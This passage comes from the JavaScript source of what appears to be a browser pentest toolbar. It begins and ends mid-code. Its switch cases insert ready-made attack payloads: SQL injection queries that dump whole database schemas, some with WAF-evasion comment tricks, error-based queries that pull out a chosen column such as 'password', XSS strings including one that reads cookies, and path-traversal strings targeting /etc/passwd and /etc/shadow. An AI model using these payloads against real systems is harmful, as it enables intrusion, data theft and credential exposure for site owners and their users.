652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
                    this.setSelectedText(newString);
                    break; 
        case 'tr0jan':
                    newString = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
                    this.setSelectedText(newString);
                    break;
        case 'mad':  
                    newString = "export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
                    this.setSelectedText(newString);
                    break;
        case 'madwaf':  
                    newString= " and@x:=concat (@:=0,(select count(*)/*!50000from*/information_schema.columns where table_schema=database() and@:=concat (@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT ";
                    this.setSelectedText(newString);
                    break;
        case 'benchmark':  
                    newString = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
                    this.setSelectedText(newString);
                    break;
        case 'r0ot':
                    newString = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30) from information_schema.tables where table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
                    this.setSelectedText(newString);
                    break;  
        case 'rummy':
                    newString = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
                    this.setSelectedText(newString);
                    break; 
        case 'ajkaro': 
                    newString = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
                    this.setSelectedText(newString);
                    break;
        case 'zenWAF':
                    newString = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
                    this.setSelectedText(newString);
                    break;
        case 'wAF':
                    newString = "(/*!50000select*/ concat+(@:=0,(/*!50000select*/ count(*) from+/*!50000information_schema.tables*/ WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat (@,0x3c62723e,/*!50000table_name*/)),@))";
                    this.setSelectedText(newString);
                    break;
         case 'errorb': 
                    txt = " OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1";
                    this.setSelectedText(txt);
                    break; 
        case 'errorb2': 
                    txt = " AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
                    this.setSelectedText(txt);
                    break;                                                                                                     
        case 'errorb3': 
                    var dbName = prompt("Database Name", "DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{        
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = " AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(table_name AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=" + dbNameFinal + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
                    this.setSelectedText(txt);
                    break;          
        case 'errorb4':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{             
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "users");                
                    var tblNameHexed = '';
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += ''+tableName.charCodeAt(i).toString(16);
                    }
                    txt = " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(column_name AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x" + tblNameHexed + " AND table_schema=" + dbNameFinal + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";                    
                    this.setSelectedText(txt);
                    break;
        case 'errorb5':
                    var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
                    if(Db == ""){dbANDtable=tableName;}
                    if(Db == "DATABASE()"){dbANDtable=tableName;}
                    else{
                    dbANDtable=Db + "." + tableName;                    
                    }
                    var columnName = prompt("Column Name", "password");
                    txt = " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(" + columnName + ") AS CHAR),0x7e)) FROM " + dbANDtable + " LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)";
                    this.setSelectedText(txt);
                    break;
                    
    

			case 'perror':
					txt = " POLYGON((select*from(select*from(select concat(@@version)f)x))";
					this.setSelectedText(txt);
					break;
			case 'perror2':
					txt = " POLYGON((select*from(select*from(select group_concat(table_name separator 0x3c62723e) from information_schema.tables where table_schema=database())f)x))";
					this.setSelectedText(txt);
					break;    

			case 'mdios':
					txt = " multipoint((select*from (select x*1E308 from (select concat(@:=0,(select count(*) from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					this.setSelectedText(txt);
					break;
			case 'mdios2':
					txt = " multipoint((select*from(select(!x-~0) from(select concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					this.setSelectedText(txt);
					break;
			case 'mdios3':
					txt = "multipoint((select*from(select(x is not null)-9223372036854775808 from (select(concat(@:=0,(select count(*) from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@))x)y)j))";
					this.setSelectedText(txt);
					break;
			case 'mdios4':
					txt = "' and multipoint((select*from(select!x-~0.from(select(select group_concat(table_name separator 0x0b)from(select table_name from information_schema.tables where table_schema=database() limit 1,20)c)x)j)h))";
					this.setSelectedText(txt);
					break;
            case 'aderror':
					txt = "and(select!x-~0. from(select(select group_concat(Version()))x)x)";
					this.setSelectedText(txt);
					break;
			case 'aderror2':
					txt = "and(select!x-~0. from(select(select group_concat(table_name separator 0x0b)from information_schema.tables where table_schema=database())x)x)";
					this.setSelectedText(txt);
					break;
			case 'mddios':
					txt = "(select x*1E308 from(select concat(@:=0,(select count(*)from information_schema.tables where table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
					this.setSelectedText(txt);
					break;
			case 'mddios2':
					txt = "(select(x is not null)-9223372036854775808 from(select(concat(@:=0,(select count(*)from information_schema.tables where table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
					this.setSelectedText(txt);
					break;
			case 'mddios3':
					txt = "(select!x-~0 from(select concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
					this.setSelectedText(txt);
					break;
			case 'mddios4':
					txt = "(select if(x,6,9)*1E308 from(select(select group_concat(table_name separator 0x0b)from information_schema.tables where table_schema=database())x)x)";
					this.setSelectedText(txt);
					break;
			case 'mddios5':
					txt = "(select!x-~0. from(select(select group_concat(table_name+separator 0x0b)from+information_schema.tables where table_schema=database())x)x)";
					this.setSelectedText(txt);
					break;
			case 'mddios6':
					txt = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select count(*) from information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					this.setSelectedText(txt);
					break;
			case 'mddios7':
					txt = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*) from information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					this.setSelectedText(txt);
					break;
			case 'mddios8':
					txt = "and(select if(x,6,9)*1E308 from(select(select group_concat(table_name separator 0x0b)from+information_schema.tables where table_schema=database())x)x)";
					this.setSelectedText(txt);
					break;
			case 'mddios9':
					txt = "and(select x*1E308 from(select concat(@:=0,(select count(*)from information_schema.tables where table_schema=database() and@:=concat(@,0x0b,table_name)),@)x)y)";
					this.setSelectedText(txt);
					break;		


            case 'dqbased':
                    txt = " AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(VERSION() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
                    this.setSelectedText(txt);
                    break;   
            case 'dqbased2':
                    txt = " AND(SELECT 1 from(SELECT COUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(schema_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.SCHEMATA WHERE table_schema!=DATABASE() LIMIT 1,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
                    this.setSelectedText(txt);
                    break;     
            case 'dqbased3':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{                 
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = " AND(SELECT 1from(SELECT COUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(table_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=" + dbNameFinal + " LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
                    this.setSelectedText(txt);
                    break;      
            case 'dqbased4':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{       
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tblName = prompt("Table Name", "users");
                    var tblNameHex = "";       
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = " AND(SELECT 1 FROM(SELECTCOUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(column_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=" + dbNameFinal + " AND table_name=0x" + tblNameHex + " LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
                    this.setSelectedText(txt);
                    break;

			case 'dqbased5':
			
                    var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;					
					}
                    var columnName = prompt("Column Name", "password");                   
                    
                    txt = " AND(SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(" + columnName +" AS CHAR),0x27,0x7e) FROM " + dbANDtable + " LIMIT+0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1";
                    this.setSelectedText(txt);
                    break;
        
         case 'waf1':
          var txt = this.getSelectedText();
          txt = txt.replace(/ /g, "/**/");
                txt= ("/*!" + txt + "*/");
                this.setSelectedText( txt );
                    break;
        case 'waf2':
        var txt = this.getSelectedText();
         txt = txt.replace(/ /g, "+");
                txt= ("/*!50000" + txt + "*/");
                this.setSelectedText( txt );
                    break;
        case 'waf3': 
        var txt = this.getSelectedText();
        txt = txt.replace(/ /g, "+");
                txt= ("/*!12345" + txt + "*/");
                this.setSelectedText( txt );
                    break;
        case 'waf4': 
        var txt = this.getSelectedText();
        txt = txt.replace(/ /g, "+");
                txt= ("/*!13337" + txt + "*/");
                this.setSelectedText( txt );
                    break; 
        case 'payload1': 
              txt = "<script>alert(1);</script>";
              this.setSelectedText( txt );
                    break; 

        case 'payload2': 
              txt = "<svg/onload=alert()>";
              this.setSelectedText( txt );
                    break;
                        case 'payload3': txt = '"><svg/onload=alert()>';
                        this.setSelectedText( txt );
                    break;

                        case 'payload4': txt = "?><script>alert(?X?)</script>";
                        this.setSelectedText( txt );
                    break;

                        case 'payload5': txt = "</ScrIpt><script>alert(1)</script>";
                        this.setSelectedText( txt );
                    break;

                        case 'payload6': txt = '"><script>alert(1)</script>';
                        this.setSelectedText( txt );
                    break;

                        case 'payload7': txt = '" onerror=alert(1) "';
                        this.setSelectedText( txt );
                    break;

                        case 'payload8': txt = '" onerror=alert(1) x="';
                        this.setSelectedText( txt );
                    break;

                        case 'payload9': txt = "-alert(1)-";
                        this.setSelectedText( txt );
                    break;
                        
                        case 'payload10': txt = "-prompt(1)-";
                        this.setSelectedText( txt );
                    break;

                       case 'payload11': txt = '<SCRIPT>+alert("X");</SCRIPT>';
                       this.setSelectedText( txt );
                    break;

                       case 'payload12': txt = '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>';
                       this.setSelectedText( txt );
                    break;

                       case 'payload13': txt = "'><x onload'=alert(1)";
                       this.setSelectedText( txt );
                    break;
                       case 'payload14': txt = "alert(/XSS/);";
                       this.setSelectedText( txt );
                    break;

                       case 'payload15': txt = "1;alert(/XSS/);";
                       this.setSelectedText( txt );
                    break;
						case 'xss2_1': txt = "';alert(String.fromCharCode(88,83,83))//'";
						this.setSelectedText( txt );
					break;
					case 'xss2_2': txt = "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
					this.setSelectedText( txt );
					break;
					case 'xss2_3': txt = "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>";
					this.setSelectedText( txt );
					break;
					case 'xss2_4': txt = "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->";
					this.setSelectedText( txt );
					break;
					case 'xss2_5': txt = "<a href=\"javascript:alert(document.cookie)\">Test XSS</a>";
					this.setSelectedText( txt );
					break;

                 case 'lfi1':
                        txt = "/etc/passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi2':
                        txt = "///etc/passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi3':
                        txt = "../../../../../../../../../../../../etc/passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi4':
                        txt = "/etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi5':
                        txt = "../../../../../../../../../../../../etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi6':
                        txt = "\\\etc\passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi7':
                        txt = "..\..\..\..\..\..\..\..\..\..\etc\passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi8':
                        txt = "\etc\passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi9':
                        txt = "..\..\..\..\..\..\..\..\..\..\etc\passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi10':
                        txt = "//etc/passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi11':
                        txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd";
                        this.setSelectedText( txt );
                    break;
            case 'lfi12':
                        txt = "//etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi13':
                        txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi14':
                        txt = "///etc/hosts";
                        this.setSelectedText( txt );
                    break;
            case 'lfi15':
                        txt = "../../../../../../../../../../../../etc/hosts";
                        this.setSelectedText( txt );
                    break;
            case 'lfi16':
                        txt = "/etc/hosts%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi17':
                        txt = "../../../../../../../../../../../../etc/hosts%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi18':
                        txt = "///etc/shadow";
                        this.setSelectedText( txt );
                    break;
            case 'lfi19':
                        txt = "../../../../../../../../../../../../etc/shadow";
                        this.setSelectedText( txt );
                    break;
            case 'lfi20':
                        txt = "/etc/shadow%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi21':
                        txt = "../../../../../../../../../../../../etc/shadow%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi22':
                        txt = "..\%20\..\%20\..\%20\../etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi23':
                        txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts";
                        this.setSelectedText( txt );
                    break;
            case 'lfi24':
                        txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi25':
                        txt = "\etc\group%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi26':
                        txt = "..\..\..\..\..\..\..\..\..\..\etc\group%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi27':
                        txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi28':
                        txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi29':
                        txt = "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00";
                        this.setSelectedText( txt );
                    break;
            case 'lfi30':
                        txt = "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
                        this.setSelectedText( txt );
                    break;
                    
            case 'bpass':
                        txt = "%23";
                        this.setSelectedText(txt);
                        break; 
            case 'bpass1':
                        txt = "')-- -";
                        this.setSelectedText(txt);
                        break;  
            case 'bpass2':
                        txt = "%60";
                        this.setSelectedText(txt);
                        break; 
            case 'bpass3':
                        txt = "')--+";
                        this.setSelectedText(txt);
